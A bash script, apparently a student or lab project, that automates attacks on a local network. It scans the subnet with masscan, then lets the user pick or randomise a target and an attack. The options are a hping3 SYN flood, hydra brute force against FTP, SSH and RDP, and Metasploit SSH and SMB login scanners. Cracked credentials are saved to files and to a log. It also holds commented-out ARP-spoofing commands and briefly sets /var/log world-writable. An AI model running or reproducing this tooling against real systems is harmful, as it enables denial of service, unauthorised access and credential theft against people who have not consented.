#!/bin.bash

#~ NETDISCOVER () {
	#~ }

#~ ARPSPOOF () {

#~ sudo -i ; echo 1 > /proc/sys/net/ipv4/ip_forward ; arpspoof -t 192.168.111.132 192.168.111.2  &
#~ xterm -hold -e sudo arpspoof -t 192.168.111.132 192.168.111.2    

#~ }

sudo chmod 777 /var/log    #~ change persmission to edit/create logs
CURRENT_IP=$(ifconfig | grep broadcast | awk '{print $2}') #~ find machine ip
CURRENT_DGATE=$(route | grep default | awk '{print $2}') #~ find machine default gateway
LOGTIME(){
	
	date +"%Y %m %d  %H:%M"
	
	}




MAN_USERPASS () {                        #~ manually insert user and password

echo -e 
read -p "Do you need to manually insert username/password?(Y/N)" -n1 insert
		case $insert in 
		y|Y)   #~ manually insert
		echo -e '\nPlease enter username. Enter Q key for next step.'
		read userinput
			while [[ $userinput != 'q' && $userinput != 'Q' ]]
			do
			echo "$userinput" >> user.txt
			read userinput
			
			done	
	
		
		echo -e '\nPlease enter password. Enter Q key for next step.'
		read passwordinput
			while [[ $passwordinput != 'q' && $passwordinput != 'Q' ]]
			do
			echo "$passwordinput" >> pass.txt
			read passwordinput
			
			done	
		
		;;
	
	
	
		n|N)  #~ dont manually insert
		;; 
		*)
		echo -e "\nUnknown key. Exiting script."
		echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
		REMOVE
		exit
		;;
		esac 

}




CRUNCH () {                   #~  create password/user list
	echo -e "\nProceed to create user list using crunch"
	read -p "Enter minimum length for username." crunch_usermin
	read -p "Enter maximum length for username." crunch_usermax
	read -p "Enter username pattern." crunch_userpattern
	crunch $crunch_usermin $crunch_usermax $crunch_userpattern > user.txt
	
	echo -e "\nProceed to create password list using crunch"
	read -p "Enter minimum length for password." crunch_pwmin
	read -p "Enter maximum length for password." crunch_pwmax
	read -p "Enter password pattern." crunch_pwpattern
	crunch $crunch_pwmin $crunch_pwmax $crunch_pwpattern > pass.txt
	
}


USER_PASS () {               #~ prompt for list
    echo -e "\n---------------------------------------------------------------------------"
	read -p "Do you have a current list of user and passwords in directory? (Y/N)"  list
	case $list in
	y|Y)   #~ have list
	MAN_USERPASS  
	;;
	n|N)   #~ no list
	CRUNCH
	MAN_USERPASS
    ;;
    *)
	echo -e "\nUnknown key. Exiting script."
	echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
	REMOVE
	exit
    ;;
	esac 
		}


VICTIM () {             #~ choose/random ip addr and port 
	echo "Do you want to choose(a) or randomise(b) an IP address/Port from the list. (Type a or b) "
	
	while true 
	do
	read WHICH_IP 
		if [ $WHICH_IP == b ] 2> /dev/null || [ $WHICH_IP == B ] 2> /dev/null #~randomise
		then
		shuf -n 1 ip_addr.txt > RANDOMIP
		victim_ip=$(cat RANDOMIP | tr ')/' ' ' | awk '{print $2}')
		victim_port=$(cat RANDOMIP | tr ')/:' ' ' | awk '{print $4}')
		echo "Selected IP:$victim_ip , PORT:$victim_port"
		break
		
		
		elif [ $WHICH_IP == a ] 2> /dev/null || [ $WHICH_IP == A ] 2> /dev/null #~choose
		then
		read -p "Please choose a number from the list." choose_ip
		num_ip=$(cat ip_addr.txt | wc -l)
			
			if [ $choose_ip -gt $num_ip ] || [ $choose_ip -le 0 ]
            then
            echo "Invalid Choice. Exiting Script."
            echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
            REMOVE
            exit 
            			
			else
			victim_ip=$(awk "NR==$choose_ip" ip_addr.txt | tr ')/' ' ' | awk '{print $2}')
			victim_port=$(awk "NR==$choose_ip" ip_addr.txt | tr ')/:' ' ' | awk '{print $4}')
			echo "Selected IP:$victim_ip , PORT:$victim_port"
			
			fi

		break
		
		
		
		
		else
		echo "Invalid choice. Please choose a or b."
		continue
		fi	
	
	done
}


ATTACK() {                      #~ choose/random attack
	echo -e "\n---------------------------------------------------------------------------" >> attack_list
	echo -e "Possible attacks:  \n\nA-hping3 \nB-hydra (ftp/ssh/rdp) \nC-msfconsole/scanner (smb/ssh)\n" >> attack_list
	echo -e "hping3 - send  custom SYN packets to targets. Act as DOS." >> attack_list
	echo -e "hydra - brute force tool that crack the credentials of the network services." >> attack_list
	echo -e "msfconsole/scanner - Test and report successful logins." >> attack_list
	echo "---------------------------------------------------------------------------" >> attack_list
	cat attack_list
	echo -e "\nDo you want to choose(a) or randomise(b) an attack from the list. (Type a or b) "
	
	
	while true 
	do
	read WHICH_ATT 
		if [ $WHICH_ATT == b ] 2> /dev/null || [ $WHICH_ATT == B ] 2> /dev/null    #~ randomise attack
		then
		attack_type=$(cat attack_list | sed '5,7!d' | shuf -n 1 | awk -F- '{print $1}')  #~ DONOTEDIT
		
		case $attack_type in


				a|A)
				echo "Selected attack type: hping3"
				echo "$(LOGTIME) Selected attack type: hping3." >> /var/log/attack.log
				VICTIM
				HPING
				;;
				
				b|B)
				echo "Selected attack type: hydra"
				echo "$(LOGTIME) Selected attack type: hydra." >> /var/log/attack.log
				VICTIM
				if [ $victim_port == 21 ] 
				then
				HYDRA_FTP

				elif [ $victim_port == 22 ] 
				then
				HYDRA_SSH 

				elif [ $victim_port == 3389 ] 
				then
				HYDRA_RDP


				else
				echo "Please enter valid port 21/22/3389. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit

				fi
				;;

				c|C)
				echo "Selected attack type: msfconsole/scanner"
				echo "$(LOGTIME) Selected attack type: msfconsole/scanner." >> /var/log/attack.log
				VICTIM
				if [ $victim_port == 445 ] 
				then
				MSFCONSOLE_SMB 

				elif [ $victim_port == 22 ] 
				then
				MSFCONSOLE_SSH 

				else
				echo "Please enter valid port 445/22. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit

				fi
				;;

				*)

				echo -e "\nUnknown key. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit
				esac
		
		
		break
		
		
		
		elif [ $WHICH_ATT == a ] 2> /dev/null || [ $WHICH_ATT == A ] 2> /dev/null  #~ Choose attack
		then
		read -p "Please choose an attack from the list. (A/B/C)" attack_type
				case $attack_type in


				a|A)
				echo "Selected attack type: hping3"
				echo "$(LOGTIME) Selected attack type: hping3." >> /var/log/attack.log
				VICTIM
				HPING
				;;
				
				b|B)
				echo "Selected attack type: hydra"
				echo "$(LOGTIME) Selected attack type: hydra." >> /var/log/attack.log
				VICTIM
				if [ $victim_port == 21 ] 
				then
				HYDRA_FTP

				elif [ $victim_port == 22 ] 
				then
				HYDRA_SSH 

				elif [ $victim_port == 3389 ] 
				then
				HYDRA_RDP

				else
				echo "Please enter valid port 21/22/3389. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit

				fi
				;;

				c|C)
				echo "Selected attack type: msfconsole/scanner"
				echo "$(LOGTIME) Selected attack type: msfconsole/scanner." >> /var/log/attack.log
				VICTIM
				if [ $victim_port == 445 ] 
				then
				MSFCONSOLE_SMB 

				elif [ $victim_port == 22 ] 
				then
				MSFCONSOLE_SSH 

				else
				echo "Please enter valid port 445/22. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit

				fi
				;;

				*)

				echo -e "\nUnknown key. Exiting script."
				echo "$(LOGTIME) Invalid selection.Script stopped." >> /var/log/attack.log
				REMOVE
				exit
				esac

			

		break
		
		
		
		
		else
		echo "Invalid choice. Please choose a or b."
		continue
		fi	
	
	done
	
	}


REMOVE () {   #~ remove unnecessary files
	rm attack_list &> /dev/null
	rm -f IPS &> /dev/null
	rm ip_addr.txt &> /dev/null
	rm credentials.txt &> /dev/null
	
	}

HYDRA_FTP () {    
	USER_PASS
	echo -e "\nYou have choosen hydra to attack victim via port 21."
	echo -e "Attempting to attack victim. Please Wait."
	echo "$(LOGTIME) hydra_ftp $victim_ip at port $victim_port started." >> /var/log/attack.log
	hydra -L user.txt -P pass.txt $victim_ip ftp -vV -t 4 | grep host >> credentials.txt
	echo "$(LOGTIME) hydra_ftp $victim_ip at port $victim_port ended." >> /var/log/attack.log
    credential=$(cat credentials.txt | tail -n1 | awk '{print $5":"$7}') 
    echo "$(LOGTIME) hydra_ftp $victim_ip at port $victim_port.User:Password=$credential." >> /var/log/attack.log
}

HYDRA_SSH () {
	USER_PASS
	echo -e "\nYou have choosen hydra to attack victim via port 22."
	echo -e "Attempting to attack victim. Please Wait."
	echo "$(LOGTIME) hydra_ssh $victim_ip at port $victim_port started." >> /var/log/attack.log
	hydra -L user.txt -P pass.txt $victim_ip ssh -vV -t 4 | grep host >> credentials.txt
	echo "$(LOGTIME) hydra_ssh $victim_ip at port $victim_port ended." >> /var/log/attack.log
    credential=$(cat credentials.txt | tail -n1 | awk '{print $5":"$7}') 
    echo "$(LOGTIME) hydra_ssh $victim_ip at port $victim_port.User:Password=$credential." >> /var/log/attack.log
}




HYDRA_RDP () {
	USER_PASS
	echo -e "\nYou have choosen hydra to attack victim via port 3389."
	echo -e "Attempting to attack victim. Please Wait."
	echo "$(LOGTIME) hydra_rdp $victim_ip at port $victim_port started." >> /var/log/attack.log
	hydra -L user.txt -P pass.txt $victim_ip rdp -vV -t 4 | grep host >> credentials.txt
	echo "$(LOGTIME) hydra_rdp $victim_ip at port $victim_port ended." >> /var/log/attack.log
    credential=$(cat credentials.txt | tail -n1 | awk '{print $5":"$7}') 
    echo "$(LOGTIME) hydra_rdp $victim_ip at port $victim_port.User:Password=$credential." >> /var/log/attack.log
}






MSFCONSOLE_SSH () {
	USER_PASS
	echo -e "\nYou have choosen msfconsole to attack victim via port 22."
	echo -e "Attempting to attack victim. Please Wait."
	echo 'use auxiliary/scanner/ssh/ssh_login' >> sshc.rc
	echo "set rhosts $victim_ip" >> sshc.rc 
	echo 'set pass_file pass.txt' >> sshc.rc
	echo 'set user_file user.txt' >> sshc.rc
	echo 'run' >> sshc.rc
	echo 'exit -y' >> sshc.rc
	echo "$(LOGTIME) msfconsole_ssh $victim_ip at port $victim_port started." >> /var/log/attack.log
	msfconsole -qr sshc.rc -o ssh_result.txt
	echo "$(LOGTIME) msfconsole_ssh $victim_ip at port $victim_port ended." >> /var/log/attack.log
	rm sshc.rc
	
	credential=$(cat ssh_result.txt | grep -i success | awk '{print $5}') 
	echo "$(LOGTIME) msfconsole_ssh $victim_ip at port $victim_port.User:Password=$credential." >> /var/log/attack.log
	cat ssh_result.txt | grep -i success >> credentials.txt
	rm ssh_result.txt
}


MSFCONSOLE_SMB () {
	USER_PASS
	echo -e "\nYou have choosen msfconsole to attack victim via port 445."
	echo -e "Attempting to attack victim. Please Wait."
	echo 'use auxiliary/scanner/smb/smb_login' >> smbc.rc
	echo "set rhosts $victim_ip" >> smbc.rc 
	echo 'set pass_file pass.txt' >> smbc.rc
	echo 'set user_file user.txt' >> smbc.rc
	echo 'run' >> smbc.rc
	echo 'exit' >> smbc.rc
	echo "$(LOGTIME) msfconsole_smb $victim_ip at port $victim_port started." >> /var/log/attack.log
	msfconsole -qr smbc.rc -o smb_result.txt
	echo "$(LOGTIME) msfconsole_smb $victim_ip at port $victim_port ended." >> /var/log/attack.log
	rm smbc.rc
	
	credential=$(cat smb_result.txt | grep Success  | awk  '{print $7}' | tr -d '.\'  2> /dev/null ) 
	echo "$(LOGTIME) msfconsole_ssh $victim_ip at port $victim_port.User:Password=$credential." >> /var/log/attack.log
	cat smb_result.txt | grep -i success >> credentials.txt
	rm smb_result.txt


}


 HPING() {
	echo -e "\n---------------------------------------------------------------------------"
	echo -e "\nYou have choosen hping3 to attack victim."
	
	echo -e "\nEnter number of packets to send."
	read hping_count
	echo -e "\nEnter packets size (1-65495)."
	read hping_size
	echo -e "\nEnter packets interval."
	read hping_interval
	echo -e "hpinging in progress. Please wait."
	echo "$(LOGTIME) hping3 $victim_ip at port $victim_port started." >> /var/log/attack.log
	sudo hping3 -S $victim_ip -p $victim_port -c $hping_count -d $hping_size -i $hping_interval &> /dev/null
	echo "$(LOGTIME) hping3 $victim_ip at port $victim_port ended." >> /var/log/attack.log
	}

#~ ------------------------------------------------------------------------------------------------------------ START 
echo "Scanning IP addresses in the network. Please wait."
sudo masscan $CURRENT_IP/24 -p 80,22,21,443,445,3389 -oG IPS &> /dev/null
echo -e "\nScanned IP addresses and ports in the network:"
cat  IPS | grep -i host | awk '{print $4$5$6$7}' | tr '()' ' ' | sort  | nl -s ") " #~ Scanned IP and ports 
cat  IPS | grep -i host | awk '{print $4$5$6$7}' | tr '()' ' ' | sort  | nl -s ") " > ip_addr.txt






ATTACK
REMOVE

echo -e "\nAttack done. credential.txt saved at current directory."
echo -e "LOGFILE located at /var/log/attack.log"
sudo chmod 644 /var/log   #~ revert permission










